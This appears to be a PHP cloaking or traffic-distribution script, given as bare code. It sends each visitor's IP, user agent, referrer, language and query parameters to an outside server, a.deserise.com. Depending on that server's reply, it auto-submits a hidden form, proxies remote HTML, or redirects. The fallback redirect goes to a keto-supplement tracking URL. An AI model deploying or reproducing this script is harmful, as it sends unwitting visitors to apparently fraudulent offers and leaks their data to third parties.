<?php
    $useTimezone = false;
    $detectTimezone = false;
    $m_arrPostData = array(
        'uid'=>'82',
        'p'=>'3d3f340ce433f4b9bb146d0b65e1efbb',
        'cid'=>'17',
        'gp'=>urlencode(json_encode(array())),
        'rp'=>urlencode(json_encode(array())),
        'ref' => isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:"",
        'addr' => getIP(),
        'ua' => isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:"",
        'host' => isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:"",
        'lang'=>isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])?$_SERVER['HTTP_ACCEPT_LANGUAGE']:"",
        'cs' => '0',
        'timezone'=> $detectTimezone,
        'useTimezone'=>$useTimezone
    );
    $arrTimezone = array(+8);
    if($useTimezone)
    {
        if(isset($_COOKIE['clickspan'])){
            $userZone = intval($_COOKIE['clickspan'])*(-1);
            if(count($arrTimezone)>0)
            {
                foreach ($arrTimezone as $value) {
                    if($userZone == $value)
                    {
                        $detectTimezone=true;
                        break;
                    }
                }
            }
        }
        $m_arrPostData['timezone']=$detectTimezone;
    }
    if (isset($_COOKIE['gc17'])) {
        $m_arrPostData['cs'] = '1';
    } else {
        setcookie('gc17', '17', time() + 3600 * 24 * 1);
    }
    if($_GET)
    {
        $nIndex=0;
        $arr = array();
        foreach ($_GET as $key => $value) {
            $arr[$nIndex]=array('name'=>urldecode($key),'value'=>urldecode($value));
            $nIndex++;
        }
        $m_arrPostData['gp']=urlencode(json_encode($arr));
    }
    if(strlen($m_arrPostData['ref'])>0)
    {
        $refanaly = parse_url($m_arrPostData['ref']);
        $refquery = $refanaly['query'];
        $refarr = explode("&", $refquery);
        if(count($refarr)>0)
        {
            $nIndex=0;
            $arr = array();
            foreach ($refarr as $value) {
                $t = explode("=", $value);
                if(count($t)==2)
                {
                    $arr[$nIndex]=array("name"=>urldecode($t[0]),"value"=>urldecode($t[1]));
                    $nIndex++;
                }
            }
            $m_arrPostData['rp']=urlencode(json_encode($arr));
        }
    }
    $m_strUrl = "http://a.deserise.com/main/query.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $m_strUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $m_arrPostData);
    $result = curl_exec($ch);
    curl_close($ch);
    $result = substr($result, stripos($result, "{"));
    if (strlen($result)>0) 
    {
        $jsonRet = json_decode($result);
        if($jsonRet->success)
        {
            $strUrl = $jsonRet->url;
            if(count($jsonRet->transport)>0)
            {
                $strParameter="";
                foreach ($jsonRet->transport as $key => $value) {
                    if(strlen($strParameter)>1)
                    {
                        $strParameter.="&";
                    }
                    $strParameter.=sprintf("%s=%s",$key,$value);
                }
                if(strlen($strParameter)>0)
                {
                    if(stripos($strUrl, '?'))
                    {
                        $strUrl = $strUrl."&".$strParameter;
                    }
                    else
                    {
                        $strUrl = $strUrl."?".$strParameter;
                    }
                }
            }
            if($jsonRet->fake)
            {
                if(intval($jsonRet->faketype)==1)
                {
                    $t_strRedirectUrl = $jsonRet->posturl;
                    ?>
                    <html>
                    <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="utf-8">
                    <head>
                    </head>
                    <body>
                        <form id="sb" action="<?php echo $t_strRedirectUrl; ?>" method="POST">
                            <input type="text" name="rdu" value="<?php echo $strUrl; ?>" />
                        </form>
                        <script type="text/javascript">
                            window.onload=function(){
                                    var frm = document.forms["sb"];
                                    frm.submit();
                                }
                        </script>
                    </body>
                    </html>
                    <?php
                }
            }
            else
            {
                if($jsonRet->LoadingHtml)
                {
                    $getch = curl_init();
                    curl_setopt($getch, CURLOPT_URL, $strUrl);
                    curl_setopt($getch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($getch, CURLOPT_FOLLOWLOCATION,true);
                    curl_setopt($getch, CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
                    $text = curl_exec($getch);
                    curl_close($getch);
                    echo $text;
                    die();
                }
                else
                {
                    header('location: '.$strUrl, TRUE, 302);
                    die();    
                }
            }
        }
        else
        {
            header('location: https://oneshotketoonline.com/track', TRUE, 302);
            die();
        }
    }
    header('location: https://oneshotketoonline.com/track', TRUE, 302);
    die();
    function getIP()
    {
        $retIp = $_SERVER['REMOTE_ADDR'];
        if(isset($_SERVER["HTTP_CF_CONNECTING_IP"]))
            $retIp = $_SERVER["HTTP_CF_CONNECTING_IP"]."|".$retIp;
        else if (isset($_SERVER["HTTP_CLIENT_IP"]))
            $retIp = $_SERVER["HTTP_CLIENT_IP"]."|".$retIp;
        else if(isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
            $retIp = $retIp."|".$_SERVER["HTTP_X_FORWARDED_FOR"];
        else if(isset($_SERVER["REMOTE_ADDR"]))
            $retIp = $retIp."|".$_SERVER['REMOTE_ADDR'];
        return $retIp;
    }
?>